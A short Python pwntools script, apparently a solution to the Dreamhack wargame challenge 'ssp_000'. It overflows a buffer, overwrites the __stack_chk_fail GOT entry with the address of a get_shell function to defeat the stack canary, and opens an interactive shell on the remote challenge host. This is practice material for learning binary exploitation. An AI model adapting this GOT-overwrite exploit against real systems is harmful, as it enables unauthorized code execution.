from pwn import *

#p = process("./ssp_000")
p = remote('host3.dreamhack.games', 23218)
e = ELF("./ssp_000")

stack_chk = e.got["__stack_chk_fail"]
shell = e.symbols["get_shell"]

print(stack_chk)
print(shell)

p.sendline(b"A" * 0x80)

p.recvuntil(b"Addr : ")
p.sendline(str(stack_chk).encode())

p.recvuntil(b"Value : ")
p.sendline(str(shell).encode())

p.interactive()